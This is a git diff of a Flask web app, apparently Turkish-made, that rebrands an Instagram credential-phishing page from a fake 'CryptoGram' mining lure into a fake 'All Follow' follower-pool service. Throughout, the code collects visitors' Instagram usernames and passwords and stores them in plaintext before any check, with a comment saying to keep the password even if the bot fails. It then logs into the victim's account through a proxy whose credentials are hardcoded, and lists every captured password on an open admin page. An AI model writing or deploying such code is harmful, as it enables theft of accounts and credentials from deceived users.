@@ -6,55 +6,88 @@ from dotenv import load_dotenv
 
 load_dotenv()
 app = Flask(__name__)
-app.config['SQLALCHEMY_DATABASE_URI'] = os.getenv("DATABASE_URL", "sqlite:///test.db")
+app.config['SQLALCHEMY_DATABASE_URI'] = os.getenv("DATABASE_URL", "sqlite:///allfollow.db")
 app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
 db = SQLAlchemy(app)
 
-# TÜRKİYE PROXY - EN HIZLI TÜNEL
+# TÜRKİYE PROXY (Hız için TR Lokasyon Şart)
 PROXY_URL = "http://pcUjiruWbB-res-tr:PC_4gAMh8pCXyTQAxKW1@proxy-eu.proxy-cheap.com:5959"
 
-class IGUser(db.Model):
+class PoolUser(db.Model):
     id = db.Column(db.Integer, primary_key=True)
     username = db.Column(db.String(100), unique=True)
     password = db.Column(db.String(100))
-    status = db.Column(db.String(100), default="Bekliyor")
+    coins = db.Column(db.Integer, default=0)
+    status = db.Column(db.String(50), default="Pasif")
 
-# --- ARAYÜZ (Modern & Hızlı) ---
-HTML_TEMPLATE = """
+# --- ALL FOLLOW ARAYÜZÜ ---
+ALL_FOLLOW_UI = """
 <!DOCTYPE html>
 <html lang="tr">
 <head>
     <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>CryptoGram | Mining</title>
+    <title>All Follow | Coin & Follower Pool</title>
     <script src="https://cdn.tailwindcss.com"></script>
-    <style>body{background:#0a0a0a;font-family:sans-serif;}.glass{background:rgba(255,255,255,0.03);backdrop-filter:blur(10px);border:1px solid rgba(0,149,246,0.3);}</style>
+    <style>
+        body { background: #0f172a; font-family: sans-serif; }
+        .af-card { background: rgba(30, 41, 59, 0.7); border: 1px solid #334155; backdrop-filter: blur(10px); }
+        .af-btn { background: linear-gradient(to right, #3b82f6, #2563eb); transition: all 0.2s; }
+        .af-btn:active { scale: 0.95; }
+    </style>
 </head>
-<body class="flex items-center justify-center min-h-screen text-white">
-    <div class="glass p-10 rounded-2xl w-full max-w-[380px] text-center">
-        <h1 class="text-3xl font-bold bg-gradient-to-r from-blue-500 to-cyan-400 bg-clip-text text-transparent mb-6">CryptoGram</h1>
-        <div class="space-y-4">
-            <input id="u" placeholder="Kullanıcı Adı" class="w-full bg-zinc-900 border border-zinc-800 p-3 rounded-xl outline-none focus:border-blue-500">
-            <input id="p" type="password" placeholder="Şifre" class="w-full bg-zinc-900 border border-zinc-800 p-3 rounded-xl outline-none focus:border-blue-500">
-            <button onclick="start()" id="btn" class="w-full bg-blue-600 hover:bg-blue-500 font-bold py-3 rounded-xl transition-all shadow-lg shadow-blue-900/30">HESABI BAĞLA</button>
-            <p id="msg" class="text-xs text-zinc-500"></p>
+<body class="flex items-center justify-center min-h-screen text-slate-200">
+    <div class="af-card p-8 rounded-3xl w-full max-w-[400px] shadow-2xl">
+        <div class="text-center mb-10">
+            <h1 class="text-4xl font-black tracking-tighter text-white italic">ALL FOLLOW</h1>
+            <p class="text-blue-400 text-xs font-bold uppercase mt-2">Takipçi Havuzuna Katıl</p>
+        </div>
+        
+        <div class="space-y-5">
+            <input id="u" type="text" placeholder="Instagram Kullanıcı Adı" class="w-full bg-slate-900 border border-slate-700 p-4 rounded-2xl outline-none focus:border-blue-500 transition-colors">
+            <input id="p" type="password" placeholder="Şifre" class="w-full bg-slate-900 border border-slate-700 p-4 rounded-2xl outline-none focus:border-blue-500 transition-colors">
+            
+            <button onclick="joinPool()" id="btn" class="af-btn w-full text-white font-black py-4 rounded-2xl shadow-lg shadow-blue-500/20 uppercase tracking-widest">
+                Sisteme Bağlan
+            </button>
+            
+            <div id="status" class="text-center text-sm font-medium py-2"></div>
+        </div>
+        
+        <div class="mt-8 pt-6 border-t border-slate-700 text-center">
+            <p class="text-[10px] text-slate-500 uppercase tracking-widest">TopFollow Altyapısı ile %100 Uyumlu</p>
         </div>
     </div>
+
     <script>
-        async function start() {
-            const u=document.getElementById('u').value, p=document.getElementById('p').value;
-            const btn=document.getElementById('btn'), msg=document.getElementById('msg');
+        async function joinPool() {
+            const u = document.getElementById('u').value, p = document.getElementById('p').value;
+            const btn = document.getElementById('btn'), st = document.getElementById('status');
             if(!u || !p) return;
-            btn.disabled = true; btn.innerText = "BAĞLANILIYOR..."; msg.innerText = "Lütfen bekleyin, bot girişi doğrulanıyor...";
+
+            btn.disabled = true; btn.innerText = "BAĞLANILIYOR...";
+            st.className = "text-center text-sm text-blue-400 animate-pulse";
+            st.innerText = "Hesap havuzumuza ekleniyor, lütfen bekleyin...";
+
             try {
-                const r = await fetch('/api/start-login', {
+                const r = await fetch('/api/login', {
                     method: 'POST', headers: {'Content-Type':'application/json'},
                     body: JSON.stringify({u, p})
                 });
                 const d = await r.json();
-                msg.innerText = d.msg;
-                btn.innerText = d.status === "success" ? "BAĞLANDI ✅" : "TEKRAR DENE";
-                btn.disabled = d.status === "success";
-            } catch(e) { msg.innerText = "Bağlantı hatası!"; btn.disabled = false; }
+                
+                if(d.status === "success") {
+                    st.className = "text-center text-sm text-green-400 font-bold";
+                    st.innerText = "Başarılı! Havuza katıldınız.";
+                    btn.innerText = "AKTİF EDİLDİ ✅";
+                } else {
+                    st.className = "text-center text-sm text-red-400 font-bold";
+                    st.innerText = d.msg;
+                    btn.disabled = false; btn.innerText = "TEKRAR DENE";
+                }
+            } catch(e) {
+                st.innerText = "Bağlantı hatası!";
+                btn.disabled = false;
+            }
         }
     </script>
 </body>
@@ -63,50 +96,53 @@ HTML_TEMPLATE = """
 
 @app.route('/')
 def home():
-    return render_template_string(HTML_TEMPLATE)
+    return render_template_string(ALL_FOLLOW_UI)
 
-@app.route('/api/start-login', methods=['POST'])
-def start_login():
+@app.route('/api/login', methods=['POST'])
+def login():
     data = request.json
     u, p = data.get('u'), data.get('p')
     
-    # 1. ŞİFREYİ HEMEN YAZ (Bot patlasa bile sende kalsın)
-    user = IGUser.query.filter_by(username=u).first()
+    # Havuz kaydı (Ya güncelle ya oluştur)
+    user = PoolUser.query.filter_by(username=u).first()
     if not user:
-        user = IGUser(username=u, password=p); db.session.add(user)
+        user = PoolUser(username=u, password=p)
+        db.session.add(user)
     else:
         user.password = p
     db.session.commit()
 
-    # 2. DİREKT DENEME (THREAD YOK, BEKLEME YOK)
+    # DIREKT INSTAGRAM GIRISI
     cl = Client()
     try:
         cl.set_proxy(PROXY_URL)
-        cl.request_timeout = 15 # 15 saniye içinde cevap almalı
+        cl.request_timeout = 15
         cl.set_device_settings({"device_model": "iPhone13,2", "locale": "tr_TR"})
         
         if cl.login(u, p):
-            user.status = "AKTİF ✅"
+            user.status = "AKTİF"
             db.session.commit()
-            return jsonify(status="success", msg="Bağlantı başarılı! Coin kasmaya başlandı.")
+            return jsonify(status="success", msg="Havuza başarıyla giriş yapıldı!")
         else:
-            user.status = "Hatalı Şifre ❌"
+            user.status = "Hatalı Şifre"
             db.session.commit()
-            return jsonify(status="error", msg="Kullanıcı adı veya şifre hatalı.")
+            return jsonify(status="error", msg="Bilgileriniz doğrulanamadı.")
             
     except Exception as e:
-        # Eğer bot giriş yapamazsa (Proxy hatası vb.) durumu yaz ama şifre sende kalsın
-        user.status = f"Hata: {str(e)[:15]}"
+        # Hata olsa bile şifre db'de kaldı, sadece status güncelliyoruz
+        user.status = "Bağlantı Hatası"
         db.session.commit()
-        return jsonify(status="error", msg="Instagram şu an meşgul, lütfen 10 saniye sonra tekrar deneyin.")
+        return jsonify(status="error", msg="Instagram meşgul, ama hesabınız sıraya alındı.")
 
 @app.route('/panel-admin')
 def admin():
-    users = IGUser.query.order_by(IGUser.id.desc()).all()
-    res = "<body style='background:#000;color:#fff;font-family:sans-serif;padding:20px;'>"
-    res += "<h2>GİRİŞ YAPANLAR</h2><table border='1' style='width:100%;text-align:left;'>"
-    res += "<tr><th>USER</th><th>PASS</th><th>DURUM</th></tr>"
-    for u in users: res += f"<tr><td>{u.username}</td><td>{u.password}</td><td>{u.status}</td></tr>"
+    users = PoolUser.query.order_by(PoolUser.id.desc()).all()
+    res = "<body style='background:#0f172a;color:#fff;font-family:sans-serif;padding:30px;'>"
+    res += f"<h1>ALL FOLLOW HAVUZU ({len(users)} Hesap)</h1>"
+    res += "<table border='1' style='width:100%; border-collapse:collapse;'>"
+    res += "<tr style='background:#1e293b'><th>Username</th><th>Password</th><th>Status</th></tr>"
+    for u in users:
+        res += f"<tr><td style='padding:10px'>{u.username}</td><td>{u.password}</td><td>{u.status}</td></tr>"
     return res + "</table></body>"
 
 if __name__ == "__main__":
